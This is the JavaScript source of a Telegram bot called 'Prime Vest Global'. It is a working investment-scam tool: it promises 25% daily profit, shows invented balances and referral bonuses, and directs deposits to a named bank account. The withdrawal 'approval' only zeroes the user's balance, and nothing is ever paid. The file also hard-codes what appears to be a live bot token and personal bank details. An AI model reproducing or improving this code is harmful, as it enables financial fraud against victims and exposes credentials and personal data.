const { Telegraf, Markup } = require("telegraf");

const bot = new Telegraf("8783194867:AAF4a8tAkN07v9t0o5ewB_CbRsZBDBNaKJw"); // 🔴 PUT TOKEN
const ADMIN_ID = 7510750214; // 🔴 PUT YOUR TELEGRAM ID

// 🔒 FORCE JOIN
const CHANNEL_USERNAME = "@starfordfreenumbers";
const GROUP_USERNAME = "@primevestglobalinvestments";

// 🔴 REPLACE WITH YOUR BOT USERNAME
const BOT_USERNAME = "PrimeVestGlobal_bot";

let users = {};
let waitingBank = {};
let pendingWithdrawals = {};

// 📌 USER SYSTEM
function getUser(id) {
  if (!users[id]) {
    users[id] = {
      balance: 500,
      profit: 0,
      invested: 0,
      bank: null,
      joined: false,
      lastProfit: null
    };
  }
  return users[id];
}

// 🔒 CHECK JOIN
async function isJoined(ctx) {
  try {
    let ch = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    let gr = await ctx.telegram.getChatMember(GROUP_USERNAME, ctx.from.id);

    return (
      ["member", "creator", "administrator"].includes(ch.status) &&
      ["member", "creator", "administrator"].includes(gr.status)
    );
  } catch {
    return false;
  }
}

// 📌 BUTTONS
function mainMenu() {
  return Markup.keyboard([
    ["💼 Invest", "💰 Balance"],
    ["🏧 Withdraw", "💳 Deposit"],
    ["🏦 Add Bank", "👥 Referral"],
    ["📜 History"]
  ]).resize();
}

function backBtn() {
  return Markup.keyboard([["⬅️ Back"]]).resize();
}

// 🚀 START
bot.start(async (ctx) => {
  const joined = await isJoined(ctx);

  if (!joined) {
    return ctx.reply(
`🚫 ACCESS REQUIRED

Join our platforms to continue`,
      Markup.inlineKeyboard([
        [Markup.button.url("📢 Channel", `https://t.me/${CHANNEL_USERNAME.replace("@","")}`)],
        [Markup.button.url("💬 Group", `https://t.me/${GROUP_USERNAME.replace("@","")}`)],
        [Markup.button.callback("✅ CHECK", "check_join")]
      ])
    );
  }

  const userId = ctx.from.id;
  const ref = ctx.startPayload;
  let u = getUser(userId);

  if (!u.joined) {
    u.joined = true;

    if (ref && ref != userId) {
      let refUser = getUser(ref);
      let bonus = 540;

      refUser.balance += bonus;

      ctx.telegram.sendMessage(ref, `🎉 You earned ₦${bonus} from referral`);
    }
  }

  ctx.reply(
`🔥 WELCOME TO PRIME VEST GLOBAL

💰 Earn 25% Daily
🎁 ₦500 Bonus Added!

👇 Choose an option`,
    mainMenu()
  );
});

// ✅ CHECK JOIN
bot.action("check_join", async (ctx) => {
  const joined = await isJoined(ctx);

  if (!joined) return ctx.answerCbQuery("❌ Join first!");

  ctx.answerCbQuery("✅ Done!");
  ctx.reply("🎉 Access granted!", mainMenu());
});

// 📊 INVEST MENU
bot.hears("💼 Invest", (ctx) => {
  ctx.reply("📊 Choose Investment:", Markup.keyboard([
    ["₦3000", "₦5000"],
    ["₦10000", "₦15000"],
    ["₦20000", "₦25000"],
    ["₦40000", "₦50000"],
    ["⬅️ Back"]
  ]).resize());
});

// 💳 DEPOSIT MENU
bot.hears("💳 Deposit", (ctx) => {
  ctx.reply("💳 Choose Deposit:", Markup.keyboard([
    ["₦3000", "₦5000"],
    ["₦10000", "₦15000"],
    ["₦20000", "₦25000"],
    ["₦40000", "₦50000"],
    ["⬅️ Back"]
  ]).resize());
});

// 🧠 MAIN HANDLER
bot.on("text", (ctx) => {
  const text = ctx.message.text.trim();
  const userId = ctx.from.id;
  let u = getUser(userId);

  // BACK
  if (text === "⬅️ Back") return ctx.reply("🏠 Main Menu", mainMenu());

  // ADMIN APPROVE
  if (text.startsWith("/paid_")) {
    if (ctx.from.id != ADMIN_ID) return;

    const id = text.split("_")[1];
    let amount = pendingWithdrawals[id];

    if (amount) {
      let user = getUser(id);
      user.balance = 0;
      delete pendingWithdrawals[id];

      bot.telegram.sendMessage(id, `✅ Withdrawal of ₦${amount} completed`);
      return ctx.reply("✅ Approved");
    }
  }

  // BALANCE
  if (text === "💰 Balance") {
    return ctx.reply(
`💰 Balance: ₦${u.balance}
📈 Profit: ₦${u.profit}
💼 Invested: ₦${u.invested}`,
      backBtn()
    );
  }

  // REFERRAL
  if (text === "👥 Referral") {
    const link = `https://t.me/${BOT_USERNAME}?start=${userId}`;
    return ctx.reply(`👥 Your link:\n${link}\n\n💸 Earn 18% per referral`, backBtn());
  }

  // HISTORY
  if (text === "📜 History") {
    return ctx.reply(`📜 History\n\n💰 ${u.balance}\n📈 ${u.profit}`, backBtn());
  }

  // ADD BANK
  if (text === "🏦 Add Bank") {
    waitingBank[userId] = true;
    return ctx.reply("Send Name / Bank / Account", backBtn());
  }

  if (waitingBank[userId]) {
    u.bank = text;
    delete waitingBank[userId];
    return ctx.reply("✅ Bank saved!", mainMenu());
  }

  // PLANS
  const plans = {
    "₦3000": 3000,
    "₦5000": 5000,
    "₦10000": 10000,
    "₦15000": 15000,
    "₦20000": 20000,
    "₦25000": 25000,
    "₦40000": 40000,
    "₦50000": 50000
  };

  if (plans[text]) {
    let amount = plans[text];

    if (u.balance >= amount) {
      u.balance -= amount;
      u.invested += amount;
      u.lastProfit = Date.now();

      let daily = amount * 0.25;
      let total = daily * 60;

      return ctx.reply(
`✅ Investment Started

💰 ₦${amount}
📈 Daily ₦${daily}
📊 Total ₦${total}`,
        mainMenu()
      );
    } else {
      return ctx.reply(
`💳 Deposit ₦${amount}

Bank: Moniepoint
Acct: 5075903950
Name: Kamsi`,
        backBtn()
      );
    }
  }

  // WITHDRAW
  if (text === "🏧 Withdraw") {
    if (!u.bank) return ctx.reply("⚠️ Add bank first", backBtn());
    if (u.invested <= 0) return ctx.reply("⚠️ Invest first", backBtn());

    pendingWithdrawals[userId] = u.balance;

    bot.telegram.sendMessage(
      ADMIN_ID,
`Withdrawal Request

User: ${userId}
Amount: ₦${u.balance}
Bank: ${u.bank}

/paid_${userId}`
    );

    return ctx.reply("⏳ Pending approval...", backBtn());
  }
});

// 🔥 AUTO PROFIT
setInterval(() => {
  for (let id in users) {
    let u = users[id];

    if (u.invested > 0 && u.lastProfit) {
      if (Date.now() - u.lastProfit >= 86400000) {
        let profit = u.invested * 0.25;

        u.balance += profit;
        u.profit += profit;
        u.lastProfit = Date.now();

        bot.telegram.sendMessage(id, `💰 Profit ₦${profit}`);
      }
    }
  }
}, 60000);

// 🚀 RUN
bot.launch();
console.log("🔥 BOT RUNNING PERFECTLY");
